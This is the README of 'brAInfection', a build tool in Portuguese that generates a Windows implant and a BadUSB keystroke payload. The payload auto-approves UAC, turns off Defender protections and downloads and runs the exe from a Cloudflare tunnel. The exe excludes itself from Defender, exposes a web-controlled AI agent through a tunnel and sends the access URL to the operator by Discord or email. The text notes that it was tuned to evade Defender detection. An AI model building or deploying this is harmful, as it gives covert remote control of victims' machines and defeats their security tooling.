# brAInfection

Gera executáveis Windows que instalam/verificam Node.js, DeepSeek Harness (`dsh`)
e `cloudflared`, expõem o `dsh web` via tunnel do Cloudflare e enviam a URL por
webhook do Discord e/ou email.

## Build

```
python build.py --deepseek-api-key SUA_CHAVE --discord-webhook "https://discord.com/api/webhooks/ID/TOKEN"
```

Obrigatório: `--deepseek-api-key`. O resto tem default. O `--email` só é
necessário se for enviar por SMTP.

## Opções principais

| Flag | Default | Descrição |
|---|---|---|
| `--port` | `13080` | porta do `dsh web` (use uma porta livre, ex: `18080`) |
| `--cloudflared-token` | vazio | named tunnel; vazio usa quick tunnel (sem API key) |
| `--hostname` | vazio | hostname do named tunnel (ex: `app.exemplo.com`); necessário com `--cloudflared-token` |
| `--smtp-host` | `smtp.gmail.com` | servidor SMTP |
| `--smtp-port` | `587` | porta SMTP |
| `--smtp-user` | `--email` | login SMTP |
| `--smtp-password` | vazio | senha/app-password SMTP |
| `--smtp-no-starttls` | off | desliga STARTTLS |
| `--discord-webhook` | vazio | URL de webhook do Discord para receber a URL |
| `--payload-url` | `http://SEU_SERVIDOR/<name>.exe` | URL que o BadUSB baixa |
| `--rule-name` | `brAInfection` | nome das regras de firewall (usado só pela cura, p/ limpar legado) |
| `--name` | `brAInfection` | nome do exe principal |
| `--console` | off | exes com janela de console |
| `--dsh-version` / `--node-version` | vazio | pin de versão |

## Artefatos gerados

| Artefato | Onde |
|---|---|
| `brAInfection.exe` | `dist\` |
| `brAInfection-cura.exe` | `Documents\` (ou `dist\` se não puder escrever) |
| `payload.txt` (BadUSB) | `dist\badusb\` |

Sem `--smtp-password` nem `--discord-webhook` a URL é salva em
`%LOCALAPPDATA%\brAInfection\url.txt` (log em `log.txt`).

## Execução do exe principal

- Requer administrador (UAC self-elevate).
- Adiciona o próprio diretório às exclusões do Defender (`Add-MpPreference`).
- Instala Node.js se faltar (winget → MSI → zip) e `@deepseek-ai/dsh` via npm.
- Sobe `cloudflared`, sobe `dsh web` em `127.0.0.1:PORTA` com `--trusted-host`
  do hostname do tunnel, captura a URL `?token=...` e envia pelo Discord/email.
- Watchdog: reinicia `dsh`/`cloudflared` se caírem; quando o quick tunnel troca
  de hostname, reinicia o `dsh` e reenvia a URL nova.
- **Não mexe no firewall** (desnecessário para o quick tunnel, que é egress, e
  era o gatilho da detecção `Behavior:Win32/DefenseEvasion` do Defender).

## Cura (brAInfection-cura)

Desfaz a implantação (precisa de admin):
- mata o brAInfection e o `cloudflared` com `--no-autoupdate`;
- mata o processo escutando na porta;
- remove regras de firewall legadas (`brAInfection` / `brAInfection-cf`);
- remove as exclusões do Defender;
- **reativa o monitoramento em tempo real do Defender** (desfaz o BadUSB);
- apaga `%TEMP%\b.exe` / `%TEMP%\s.ps1` (restos do BadUSB);
- apaga `%LOCALAPPDATA%\brAInfection`.

## BadUSB (dist\badusb\)

**Servido automaticamente via cloudflared** — sem `SEU_SERVIDOR`. O `build.py`
sobe um servidor HTTP local com o exe, abre um quick tunnel do cloudflared,
pega a URL real e **embute no payload**:

```
python build.py --deepseek-api-key SUA_CHAVE --discord-webhook "..." --port 18080
```

O build termina com o servidor **ativo** (imprime as URLs; deixe aberto durante
a implantação, `Ctrl+C` para parar). O `payload.txt` é o payload de **2 fases**
(testado, passa pelo Defender):

Fase 1 — eleva o PowerShell (`Start-Process -Verb RunAs`), auto-clica "Sim"
(`LEFT` + `ENTER`) e volta o foco com `ALT TAB`.
Fase 2 — no console elevado:
- desliga monitoramento em tempo real + behavior + block-at-first-seen +
  IOAV + script scanning (`Set-MpPreference ... 1`);
- baixa o exe direto do tunnel (`iwr <url> -o $env:TEMP\b.exe -UseBasicParsing`),
  executa (`saps $env:TEMP\b.exe`) e fecha o console no fim (`;exit`).

Obs.: as URLs do quick tunnel são efêmeras — valem enquanto o build estiver
rodando. `--payload-url` continua disponível como modo manual.
Layout do Bruce/Cardputer tem que ser o mesmo do teclado do alvo.
